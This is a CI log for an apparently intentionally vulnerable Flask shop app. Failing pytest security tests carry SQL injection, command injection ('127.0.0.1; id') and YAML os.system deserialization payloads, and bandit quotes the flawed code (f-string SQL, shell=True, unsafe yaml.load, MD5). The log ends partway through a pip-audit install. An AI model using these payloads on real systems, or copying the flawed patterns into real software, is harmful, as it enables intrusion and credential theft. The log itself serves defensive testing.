@@ -1,0 +1,888 @@
+
+===== job security-tests (stage test, image python:3.12-slim) =====
+Collecting pytest
+  Downloading pytest-9.2.0-py3-none-any.whl.metadata (7.9 kB)
+Collecting Flask==2.2.2 (from -r requirements.txt (line 1))
+  Downloading Flask-2.2.2-py3-none-any.whl.metadata (3.9 kB)
+Collecting Werkzeug==2.2.2 (from -r requirements.txt (line 2))
+  Downloading Werkzeug-2.2.2-py3-none-any.whl.metadata (4.4 kB)
+Collecting Jinja2==3.1.2 (from -r requirements.txt (line 3))
+  Downloading Jinja2-3.1.2-py3-none-any.whl.metadata (3.5 kB)
+Collecting PyJWT==1.7.1 (from -r requirements.txt (line 4))
+  Downloading PyJWT-1.7.1-py2.py3-none-any.whl.metadata (3.9 kB)
+Collecting PyYAML==5.3.1 (from -r requirements.txt (line 5))
+  Downloading PyYAML-5.3.1.tar.gz (269 kB)
+  Installing build dependencies: started
+  Installing build dependencies: finished with status 'done'
+  Getting requirements to build wheel: started
+  Getting requirements to build wheel: finished with status 'done'
+  Preparing metadata (pyproject.toml): started
+  Preparing metadata (pyproject.toml): finished with status 'done'
+Collecting requests==2.25.1 (from -r requirements.txt (line 6))
+  Downloading requests-2.25.1-py2.py3-none-any.whl.metadata (4.2 kB)
+Collecting urllib3==1.26.4 (from -r requirements.txt (line 7))
+  Downloading urllib3-1.26.4-py2.py3-none-any.whl.metadata (43 kB)
+Collecting itsdangerous>=2.0 (from Flask==2.2.2->-r requirements.txt (line 1))
+  Downloading itsdangerous-2.2.0-py3-none-any.whl.metadata (1.9 kB)
+Collecting click>=8.0 (from Flask==2.2.2->-r requirements.txt (line 1))
+  Downloading click-8.5.1-py3-none-any.whl.metadata (2.6 kB)
+Collecting MarkupSafe>=2.1.1 (from Werkzeug==2.2.2->-r requirements.txt (line 2))
+  Downloading markupsafe-3.0.4-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (2.7 kB)
+Collecting chardet<5,>=3.0.2 (from requests==2.25.1->-r requirements.txt (line 6))
+  Downloading chardet-4.0.0-py2.py3-none-any.whl.metadata (3.5 kB)
+Collecting idna<3,>=2.5 (from requests==2.25.1->-r requirements.txt (line 6))
+  Downloading idna-2.10-py2.py3-none-any.whl.metadata (9.1 kB)
+Collecting certifi>=2017.4.17 (from requests==2.25.1->-r requirements.txt (line 6))
+  Downloading certifi-2026.10.23-py3-none-any.whl.metadata (2.5 kB)
+Collecting iniconfig>=2 (from pytest)
+  Downloading iniconfig-2.3.1-py3-none-any.whl.metadata (2.8 kB)
+Collecting packaging>=24 (from pytest)
+  Downloading packaging-26.3-py3-none-any.whl.metadata (3.5 kB)
+Collecting pluggy<2,>=1.6 (from pytest)
+  Downloading pluggy-1.7.0-py3-none-any.whl.metadata (5.0 kB)
+Collecting pygments>=2.15 (from pytest)
+  Downloading pygments-2.21.0-py3-none-any.whl.metadata (2.5 kB)
+Downloading Flask-2.2.2-py3-none-any.whl (101 kB)
+Downloading Werkzeug-2.2.2-py3-none-any.whl (232 kB)
+Downloading Jinja2-3.1.2-py3-none-any.whl (133 kB)
+Downloading PyJWT-1.7.1-py2.py3-none-any.whl (18 kB)
+Downloading requests-2.25.1-py2.py3-none-any.whl (61 kB)
+Downloading urllib3-1.26.4-py2.py3-none-any.whl (153 kB)
+Downloading pytest-9.2.0-py3-none-any.whl (411 kB)
+Downloading certifi-2026.10.23-py3-none-any.whl (135 kB)
+Downloading chardet-4.0.0-py2.py3-none-any.whl (178 kB)
+Downloading click-8.5.1-py3-none-any.whl (126 kB)
+Downloading idna-2.10-py2.py3-none-any.whl (58 kB)
+Downloading iniconfig-2.3.1-py3-none-any.whl (7.6 kB)
+Downloading itsdangerous-2.2.0-py3-none-any.whl (16 kB)
+Downloading markupsafe-3.0.4-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (22 kB)
+Downloading packaging-26.3-py3-none-any.whl (129 kB)
+Downloading pluggy-1.7.0-py3-none-any.whl (27 kB)
+Downloading pygments-2.21.0-py3-none-any.whl (1.3 MB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.3/1.3 MB 3.6 MB/s eta 0:00:00
+Building wheels for collected packages: PyYAML
+  Building wheel for PyYAML (pyproject.toml): started
+  Building wheel for PyYAML (pyproject.toml): finished with status 'done'
+  Created wheel for PyYAML: filename=pyyaml-5.3.1-cp312-cp312-linux_x86_64.whl size=44727 sha256=5856af477662044ed7b07a1b3c13d90434ec5ac89ffc5e041b19d1b6d1a7328a
+  Stored in directory: /root/.cache/pip/wheels/70/0a/5e/af6e14e735a67c9944c3f5e024f30dcd355ceba8758305f52e
+Successfully built PyYAML
+Installing collected packages: PyJWT, urllib3, PyYAML, pygments, pluggy, packaging, MarkupSafe, itsdangerous, iniconfig, idna, click, chardet, certifi, Werkzeug, requests, pytest, Jinja2, Flask
+Successfully installed Flask-2.2.2 Jinja2-3.1.2 MarkupSafe-3.0.4 PyJWT-1.7.1 PyYAML-5.3.1 Werkzeug-2.2.2 certifi-2026.10.23 chardet-4.0.0 click-8.5.1 idna-2.10 iniconfig-2.3.1 itsdangerous-2.2.0 packaging-26.3 pluggy-1.7.0 pygments-2.21.0 pytest-9.2.0 requests-2.25.1 urllib3-1.26.4
+WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning.
+
+[notice] A new release of pip is available: 25.0.1 -> 26.3
+[notice] To update, run: pip install --upgrade pip
+============================= test session starts ==============================
+platform linux -- Python 3.12.16, pytest-9.2.0, pluggy-1.7.0
+rootdir: /builds/pr6
+configfile: pytest.ini
+testpaths: tests
+collected 15 items
+
+tests/test_security.py FFF.F.FFFF.FFFF                                   [100%]
+
+=================================== FAILURES ===================================
+_________________ test_login_sql_injection_bypass_is_rejected __________________
+
+client = <FlaskClient <Flask 'src.shop.app'>>
+
+    def test_login_sql_injection_bypass_is_rejected(client):
+        r = client.post("/api/login", json={"username": "admin' --", "password": "x"})
+>       assert r.status_code == 401
+E       assert 200 == 401
+E        +  where 200 = <WrapperTestResponse streamed [200 OK]>.status_code
+
+tests/test_security.py:34: AssertionError
+_________________ test_login_sql_injection_or_true_is_rejected _________________
+
+client = <FlaskClient <Flask 'src.shop.app'>>
+
+    def test_login_sql_injection_or_true_is_rejected(client):
+        r = client.post("/api/login", json={"username": "' OR 1=1 --", "password": "x"})
+>       assert r.status_code == 401
+E       assert 200 == 401
+E        +  where 200 = <WrapperTestResponse streamed [200 OK]>.status_code
+
+tests/test_security.py:39: AssertionError
+_______________ test_search_union_injection_does_not_leak_users ________________
+
+client = <FlaskClient <Flask 'src.shop.app'>>
+
+    def test_search_union_injection_does_not_leak_users(client):
+        r = client.get("/api/products", query_string={"q": "zzz' UNION SELECT id, username, password, role FROM users --"})
+        body = r.get_data(as_text=True)
+>       assert "admin" not in body and "aliya" not in body
+E       assert ('admin' not in '[{"descript...":"user"}]\n'
+E         
+E         'admin' is contained here:
+E           1,"name":"admin","price":"admin"},{"description":"18010f1845ab6314846de938bbf93335","id":2,"name":"aliya","price":"user"},{"description":"1750ea32d659d08b6c51f64cb255633b","id":3,"name":"timur","price":"user"},{"description":"da43c505453671f467ecaa63c0e1b6f0","id":4,"name":"dana","price":"user"}]
+E         ?           +++++)
+
+tests/test_security.py:45: AssertionError
+____________________ test_ping_command_injection_is_blocked ____________________
+
+client = <FlaskClient <Flask 'src.shop.app'>>
+
+    def test_ping_command_injection_is_blocked(client):
+        r = client.get("/api/tools/ping", query_string={"host": "127.0.0.1; id"})
+>       assert r.status_code in (400, 404)
+E       assert 200 in (400, 404)
+E        +  where 200 = <WrapperTestResponse streamed [200 OK]>.status_code
+
+tests/test_security.py:55: AssertionError
+____________________ test_idor_foreign_profile_is_forbidden ____________________
+
+client = <FlaskClient <Flask 'src.shop.app'>>
+
+    def test_idor_foreign_profile_is_forbidden(client):
+        h = login(client, "aliya")
+>       assert client.get("/api/users/3", headers=h).status_code == 403
+E       AssertionError: assert 200 == 403
+E        +  where 200 = <WrapperTestResponse streamed [200 OK]>.status_code
+E        +    where <WrapperTestResponse streamed [200 OK]> = get('/api/users/3', headers={'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOjIsInVzZXJuYW1lIjoiYWxpeWEiLCJyb2xlIjoidXNlciJ9.fXInHtEC6QDjWbzS5QVMju_D-ktxI0LBOvX8aDx9EO0'})
+E        +      where get = <FlaskClient <Flask 'src.shop.app'>>.get
+
+tests/test_security.py:68: AssertionError
+_____________________ test_idor_foreign_order_is_forbidden _____________________
+
+client = <FlaskClient <Flask 'src.shop.app'>>
+
+    def test_idor_foreign_order_is_forbidden(client):
+        h = login(client, "aliya")
+>       assert client.get("/api/orders/2", headers=h).status_code == 403
+E       AssertionError: assert 200 == 403
+E        +  where 200 = <WrapperTestResponse streamed [200 OK]>.status_code
+E        +    where <WrapperTestResponse streamed [200 OK]> = get('/api/orders/2', headers={'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOjIsInVzZXJuYW1lIjoiYWxpeWEiLCJyb2xlIjoidXNlciJ9.fXInHtEC6QDjWbzS5QVMju_D-ktxI0LBOvX8aDx9EO0'})
+E        +      where get = <FlaskClient <Flask 'src.shop.app'>>.get
+
+tests/test_security.py:73: AssertionError
+____________________ test_admin_endpoint_forbidden_for_user ____________________
+
+client = <FlaskClient <Flask 'src.shop.app'>>
+
+    def test_admin_endpoint_forbidden_for_user(client):
+        h = login(client, "timur")
+>       assert client.get("/api/admin/users", headers=h).status_code == 403
+E       AssertionError: assert 200 == 403
+E        +  where 200 = <WrapperTestResponse streamed [200 OK]>.status_code
+E        +    where <WrapperTestResponse streamed [200 OK]> = get('/api/admin/users', headers={'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOjMsInVzZXJuYW1lIjoidGltdXIiLCJyb2xlIjoidXNlciJ9.2pBzaYVGAmpzktJG9vKjrAX9312Fu-7lZseg_AboXi4'})
+E        +      where get = <FlaskClient <Flask 'src.shop.app'>>.get
+
+tests/test_security.py:78: AssertionError
+________ test_admin_endpoint_allowed_for_admin_without_password_hashes _________
+
+client = <FlaskClient <Flask 'src.shop.app'>>
+
+    def test_admin_endpoint_allowed_for_admin_without_password_hashes(client):
+        h = login(client, "admin")
+        r = client.get("/api/admin/users", headers=h)
+        assert r.status_code == 200
+>       assert all("password" not in u for u in r.get_json())
+E       assert False
+E        +  where False = all(<generator object test_admin_endpoint_allowed_for_admin_without_password_hashes.<locals>.<genexpr> at 0x76660c86f920>)
+
+tests/test_security.py:85: AssertionError
+___________________ test_yaml_import_rejects_python_objects ____________________
+
+client = <FlaskClient <Flask 'src.shop.app'>>
+
+    def test_yaml_import_rejects_python_objects(client):
+        payload = b'!!python/object/apply:os.system ["echo pwned"]'
+        r = client.post("/api/import", data=payload, headers=login(client, "admin"))
+>       assert r.status_code == 400
+E       assert 200 == 400
+E        +  where 200 = <WrapperTestResponse streamed [200 OK]>.status_code
+
+tests/test_security.py:96: AssertionError
+----------------------------- Captured stdout call -----------------------------
+pwned
+_____________________ test_errors_do_not_leak_stack_trace ______________________
+
+client = <FlaskClient <Flask 'src.shop.app'>>
+
+    def test_errors_do_not_leak_stack_trace(client):
+        r = client.post("/api/login", data="not-json", headers={"Content-Type": "application/json"})
+>       assert "Traceback" not in r.get_data(as_text=True)
+E       assert 'Traceback' not in '{"error":"4...tand.\\n"}\n'
+E         
+E         'Traceback' is contained here:
+E         ?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ...
+E         
+E         ...Full output truncated, use '-vv' to show
+
+tests/test_security.py:101: AssertionError
+________________________ test_security_headers_present _________________________
+
+client = <FlaskClient <Flask 'src.shop.app'>>
+
+    def test_security_headers_present(client):
+        r = client.get("/api/products")
+>       assert r.headers.get("X-Content-Type-Options") == "nosniff"
+E       AssertionError: assert None == 'nosniff'
+E        +  where None = get('X-Content-Type-Options')
+E        +    where get = Headers([('Content-Type', 'application/json'), ('Content-Length', '1089')]).get
+E        +      where Headers([('Content-Type', 'application/json'), ('Content-Length', '1089')]) = <WrapperTestResponse streamed [200 OK]>.headers
+
+tests/test_security.py:106: AssertionError
+_____________________ test_passwords_are_not_unsalted_md5 ______________________
+
+client = <FlaskClient <Flask 'src.shop.app'>>
+
+    def test_passwords_are_not_unsalted_md5(client):
+        row = db.get_conn().execute("SELECT password FROM users WHERE username='admin'").fetchone()
+>       assert len(row["password"]) != 32 and "$" in row["password"]
+E       AssertionError: assert (32 != 32)
+E        +  where 32 = len('8c09012a00e1cbb212f0414febf629cd')
+
+tests/test_security.py:113: AssertionError
+=============================== warnings summary ===============================
+../../usr/local/lib/python3.12/site-packages/werkzeug/routing/rules.py:726: 17 warnings
+  /usr/local/lib/python3.12/site-packages/werkzeug/routing/rules.py:726: DeprecationWarning: ast.Str is deprecated and will be removed in Python 3.14; use ast.Constant instead
+    parts = parts or [ast.Str("")]
+
+../../usr/local/lib/python3.12/site-packages/werkzeug/routing/rules.py:723: 74 warnings
+  /usr/local/lib/python3.12/site-packages/werkzeug/routing/rules.py:723: DeprecationWarning: ast.Str is deprecated and will be removed in Python 3.14; use ast.Constant instead
+    _convert(elem) if is_dynamic else ast.Str(s=elem)
+
+../../usr/local/lib/python3.12/ast.py:587: 74 warnings
+  /usr/local/lib/python3.12/ast.py:587: DeprecationWarning: Attribute s is deprecated and will be removed in Python 3.14; use value instead
+    return Constant(*args, **kwargs)
+
+../../usr/local/lib/python3.12/site-packages/werkzeug/routing/rules.py:730: 122 warnings
+  /usr/local/lib/python3.12/site-packages/werkzeug/routing/rules.py:730: DeprecationWarning: ast.Str is deprecated and will be removed in Python 3.14; use ast.Constant instead
+    if isinstance(p, ast.Str) and isinstance(ret[-1], ast.Str):
+
+../../usr/local/lib/python3.12/site-packages/werkzeug/routing/rules.py:731: 116 warnings
+  /usr/local/lib/python3.12/site-packages/werkzeug/routing/rules.py:731: DeprecationWarning: Attribute s is deprecated and will be removed in Python 3.14; use value instead
+    ret[-1] = ast.Str(ret[-1].s + p.s)
+
+../../usr/local/lib/python3.12/site-packages/werkzeug/routing/rules.py:731: 58 warnings
+  /usr/local/lib/python3.12/site-packages/werkzeug/routing/rules.py:731: DeprecationWarning: ast.Str is deprecated and will be removed in Python 3.14; use ast.Constant instead
+    ret[-1] = ast.Str(ret[-1].s + p.s)
+
+tests/test_security.py::test_user_can_read_own_profile
+tests/test_security.py::test_idor_foreign_profile_is_forbidden
+tests/test_security.py::test_idor_foreign_order_is_forbidden
+tests/test_security.py::test_admin_endpoint_forbidden_for_user
+tests/test_security.py::test_admin_endpoint_allowed_for_admin_without_password_hashes
+  /usr/local/lib/python3.12/site-packages/jwt/api_jwt.py:125: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+    now = timegm(datetime.utcnow().utctimetuple())
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+------------------ generated xml file: /builds/pr6/pytest.xml ------------------
+=========================== short test summary info ============================
+FAILED tests/test_security.py::test_login_sql_injection_bypass_is_rejected - ...
+FAILED tests/test_security.py::test_login_sql_injection_or_true_is_rejected
+FAILED tests/test_security.py::test_search_union_injection_does_not_leak_users
+FAILED tests/test_security.py::test_ping_command_injection_is_blocked - asser...
+FAILED tests/test_security.py::test_idor_foreign_profile_is_forbidden - Asser...
+FAILED tests/test_security.py::test_idor_foreign_order_is_forbidden - Asserti...
+FAILED tests/test_security.py::test_admin_endpoint_forbidden_for_user - Asser...
+FAILED tests/test_security.py::test_admin_endpoint_allowed_for_admin_without_password_hashes
+FAILED tests/test_security.py::test_yaml_import_rejects_python_objects - asse...
+FAILED tests/test_security.py::test_errors_do_not_leak_stack_trace - assert '...
+FAILED tests/test_security.py::test_security_headers_present - AssertionError...
+FAILED tests/test_security.py::test_passwords_are_not_unsalted_md5 - Assertio...
+================== 12 failed, 3 passed, 466 warnings in 5.45s ==================
+===== job security-tests: failed (exit 1)
+
+===== job semgrep-gate (stage security, image semgrep/semgrep:latest) =====
+               
+               
+┌─────────────┐
+│ Scan Status │
+└─────────────┘
+  Scanning 4 files tracked by git with 210 Code rules:
+                                                                                                                        
+  Language      Rules   Files          Origin      Rules                                                                
+ ─────────────────────────────        ───────────────────                                                               
+  python           58       4          Community     207                                                                
+  <multilang>      37       4          Custom          3                                                                
+                                                                                                                        
+                
+                
+┌──────────────┐
+│ Scan Summary │
+└──────────────┘
+✅ Scan completed successfully.
+ • Findings: 13 (13 blocking)
+ • Rules run: 95
+ • Targets scanned: 4
+ • Parsed lines: ~100.0%
+ • Scan was limited to files tracked by git
+ • For a detailed list of skipped files and lines, run semgrep with the --verbose flag
+Ran 95 rules on 4 files: 13 findings.
+===== job semgrep-gate: failed (exit 1)
+
+===== job bandit-gate (stage security, image python:3.12-slim) =====
+Collecting bandit==1.8.6
+  Downloading bandit-1.8.6-py3-none-any.whl.metadata (6.9 kB)
+Collecting PyYAML>=5.3.1 (from bandit==1.8.6)
+  Downloading pyyaml-6.0.3-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (2.4 kB)
+Collecting stevedore>=1.20.0 (from bandit==1.8.6)
+  Downloading stevedore-5.10.0-py3-none-any.whl.metadata (2.3 kB)
+Collecting rich (from bandit==1.8.6)
+  Downloading rich-15.0.0-py3-none-any.whl.metadata (18 kB)
+Collecting markdown-it-py>=2.2.0 (from rich->bandit==1.8.6)
+  Downloading markdown_it_py-4.3.0-py3-none-any.whl.metadata (7.9 kB)
+Collecting pygments<3.0.0,>=2.13.0 (from rich->bandit==1.8.6)
+  Downloading pygments-2.21.0-py3-none-any.whl.metadata (2.5 kB)
+Collecting mdurl~=0.1 (from markdown-it-py>=2.2.0->rich->bandit==1.8.6)
+  Downloading mdurl-0.1.2-py3-none-any.whl.metadata (1.6 kB)
+Downloading bandit-1.8.6-py3-none-any.whl (133 kB)
+Downloading pyyaml-6.0.3-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (807 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 807.9/807.9 kB 4.2 MB/s eta 0:00:00
+Downloading stevedore-5.10.0-py3-none-any.whl (56 kB)
+Downloading rich-15.0.0-py3-none-any.whl (310 kB)
+Downloading markdown_it_py-4.3.0-py3-none-any.whl (96 kB)
+Downloading pygments-2.21.0-py3-none-any.whl (1.3 MB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.3/1.3 MB 9.9 MB/s eta 0:00:00
+Downloading mdurl-0.1.2-py3-none-any.whl (10.0 kB)
+Installing collected packages: stevedore, PyYAML, pygments, mdurl, markdown-it-py, rich, bandit
+Successfully installed PyYAML-6.0.3 bandit-1.8.6 markdown-it-py-4.3.0 mdurl-0.1.2 pygments-2.21.0 rich-15.0.0 stevedore-5.10.0
+WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning.
+
+[notice] A new release of pip is available: 25.0.1 -> 26.3
+[notice] To update, run: pip install --upgrade pip
+[main]	INFO	profile include tests: None
+[main]	INFO	profile exclude tests: None
+[main]	INFO	cli include tests: None
+[main]	INFO	cli exclude tests: None
+[json]	INFO	JSON output written to file: bandit.json
+{
+  "errors": [],
+  "generated_at": "2026-11-18T12:34:51Z",
+  "metrics": {
+    "_totals": {
+      "CONFIDENCE.HIGH": 4,
+      "CONFIDENCE.LOW": 1,
+      "CONFIDENCE.MEDIUM": 4,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 3,
+      "SEVERITY.LOW": 2,
+      "SEVERITY.MEDIUM": 4,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 142,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "src/__init__.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 0,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "src/shop/__init__.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 0,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "src/shop/app.py": {
+      "CONFIDENCE.HIGH": 4,
+      "CONFIDENCE.LOW": 1,
+      "CONFIDENCE.MEDIUM": 4,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 3,
+      "SEVERITY.LOW": 2,
+      "SEVERITY.MEDIUM": 4,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 82,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "src/shop/db.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 60,
+      "nosec": 0,
+      "skipped_tests": 0
+    }
+  },
+  "results": [
+    {
+      "code": "24     # A02: \u0443\u0441\u0442\u0430\u0440\u0435\u0432\u0448\u0430\u044f \u0445\u0435\u0448-\u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0431\u0435\u0437 \u0441\u043e\u043b\u0438\n25     return hashlib.md5(password.encode()).hexdigest()\n26 \n",
+      "col_offset": 11,
+      "end_col_offset": 41,
+      "filename": "src/shop/app.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 327,
+        "link": "https://cwe.mitre.org/data/definitions/327.html"
+      },
+      "issue_severity": "HIGH",
+      "issue_text": "Use of weak MD5 hash for security. Consider usedforsecurity=False",
+      "line_number": 25,
+      "line_range": [
+        25
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.8.6/plugins/b324_hashlib.html",
+      "test_id": "B324",
+      "test_name": "hashlib"
+    },
+    {
+      "code": "60     # A03: SQL-\u0438\u043d\u044a\u0435\u043a\u0446\u0438\u044f \u0432 \u043f\u043e\u0438\u0441\u043a\u0435 (f-\u0441\u0442\u0440\u043e\u043a\u0430)\n61     rows = conn.execute(f\"SELECT id, name, description, price FROM products WHERE name LIKE '%{q}%'\").fetchall()\n62     return jsonify([dict(r) for r in rows])\n",
+      "col_offset": 26,
+      "end_col_offset": 94,
+      "filename": "src/shop/app.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 89,
+        "link": "https://cwe.mitre.org/data/definitions/89.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Possible SQL injection vector through string-based query construction.",
+      "line_number": 61,
+      "line_range": [
+        61
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.8.6/plugins/b608_hardcoded_sql_expressions.html",
+      "test_id": "B608",
+      "test_name": "hardcoded_sql_expressions"
+    },
+    {
+      "code": "97     # A03: \u0432\u043d\u0435\u0434\u0440\u0435\u043d\u0438\u0435 \u043a\u043e\u043c\u0430\u043d\u0434 \u041e\u0421 \u0447\u0435\u0440\u0435\u0437 shell=True\n98     out = subprocess.run(\"ping -c 1 \" + host, shell=True, capture_output=True, text=True)\n99     return jsonify(output=out.stdout)\n",
+      "col_offset": 10,
+      "end_col_offset": 89,
+      "filename": "src/shop/app.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "HIGH",
+      "issue_text": "subprocess call with shell=True identified, security issue.",
+      "line_number": 98,
+      "line_range": [
+        98
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.8.6/plugins/b602_subprocess_popen_with_shell_equals_true.html",
+      "test_id": "B602",
+      "test_name": "subprocess_popen_with_shell_equals_true"
+    },
+    {
+      "code": "104     # A08: \u043d\u0435\u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u0430\u044f \u0434\u0435\u0441\u0435\u0440\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f YAML (yaml.load \u0431\u0435\u0437 SafeLoader)\n105     data = yaml.load(request.data, Loader=yaml.Loader)\n106     return jsonify(imported=len(data or []))\n",
+      "col_offset": 11,
+      "end_col_offset": 54,
+      "filename": "src/shop/app.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 20,
+        "link": "https://cwe.mitre.org/data/definitions/20.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Use of unsafe yaml load. Allows instantiation of arbitrary objects. Consider yaml.safe_load().",
+      "line_number": 105,
+      "line_range": [
+        105
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.8.6/plugins/b506_yaml_load.html",
+      "test_id": "B506",
+      "test_name": "yaml_load"
+    },
+    {
+      "code": "117     # A05: \u043e\u0442\u043b\u0430\u0434\u043e\u0447\u043d\u044b\u0439 \u0440\u0435\u0436\u0438\u043c \u0438 \u043f\u0440\u043e\u0441\u043b\u0443\u0448\u0438\u0432\u0430\u043d\u0438\u0435 \u0432\u0441\u0435\u0445 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u043e\u0432\n118     app.run(host=\"0.0.0.0\", port=5000, debug=True)\n119 \n",
+      "col_offset": 4,
+      "end_col_offset": 50,
+      "filename": "src/shop/app.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 94,
+        "link": "https://cwe.mitre.org/data/definitions/94.html"
+      },
+      "issue_severity": "HIGH",
+      "issue_text": "A Flask app appears to be run with debug=True, which exposes the Werkzeug debugger and allows the execution of arbitrary code.",
+      "line_number": 118,
+      "line_range": [
+        118
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.8.6/plugins/b201_flask_debug_true.html",
+      "test_id": "B201",
+      "test_name": "flask_debug_true"
+    },
+    {
+      "code": "117     # A05: \u043e\u0442\u043b\u0430\u0434\u043e\u0447\u043d\u044b\u0439 \u0440\u0435\u0436\u0438\u043c \u0438 \u043f\u0440\u043e\u0441\u043b\u0443\u0448\u0438\u0432\u0430\u043d\u0438\u0435 \u0432\u0441\u0435\u0445 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u043e\u0432\n118     app.run(host=\"0.0.0.0\", port=5000, debug=True)\n119 \n",
+      "col_offset": 17,
+      "end_col_offset": 26,
+      "filename": "src/shop/app.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 605,
+        "link": "https://cwe.mitre.org/data/definitions/605.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Possible binding to all interfaces.",
+      "line_number": 118,
+      "line_range": [
+        118
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.8.6/plugins/b104_hardcoded_bind_all_interfaces.html",
+      "test_id": "B104",
+      "test_name": "hardcoded_bind_all_interfaces"
+    }
+  ]
+}===== job bandit-gate: failed (exit 1)
+
+===== job pip-audit-gate (stage security, image python:3.12-slim) =====
+Collecting pip-audit==2.9.0
+  Downloading pip_audit-2.9.0-py3-none-any.whl.metadata (27 kB)
+Collecting CacheControl>=0.13.0 (from CacheControl[filecache]>=0.13.0->pip-audit==2.9.0)
+  Downloading cachecontrol-0.15.0-py3-none-any.whl.metadata (2.5 kB)
+Collecting cyclonedx-python-lib<10,>=5 (from pip-audit==2.9.0)
+  Downloading cyclonedx_python_lib-9.1.0-py3-none-any.whl.metadata (6.5 kB)
+Collecting packaging>=23.0.0 (from pip-audit==2.9.0)
+  Downloading packaging-26.3-py3-none-any.whl.metadata (3.5 kB)
+Collecting pip-api>=0.0.28 (from pip-audit==2.9.0)
+  Downloading pip_api-0.0.35-py3-none-any.whl.metadata (17 kB)
+Collecting pip-requirements-parser>=32.0.0 (from pip-audit==2.9.0)
+  Downloading pip_requirements_parser-32.0.1-py3-none-any.whl.metadata (9.3 kB)
+Collecting requests>=2.31.0 (from pip-audit==2.9.0)
+  Downloading requests-2.34.2-py3-none-any.whl.metadata (4.8 kB)
+Collecting rich>=12.4 (from pip-audit==2.9.0)
+  Downloading rich-15.0.0-py3-none-any.whl.metadata (18 kB)
+Collecting toml>=0.10 (from pip-audit==2.9.0)
+  Downloading toml-0.10.2-py2.py3-none-any.whl.metadata (7.1 kB)
+Collecting platformdirs>=4.2.0 (from pip-audit==2.9.0)
+  Downloading platformdirs-4.14.7-py3-none-any.whl.metadata (5.7 kB)
+Collecting msgpack<2.0.0,>=0.5.2 (from CacheControl>=0.13.0->CacheControl[filecache]>=0.13.0->pip-audit==2.9.0)
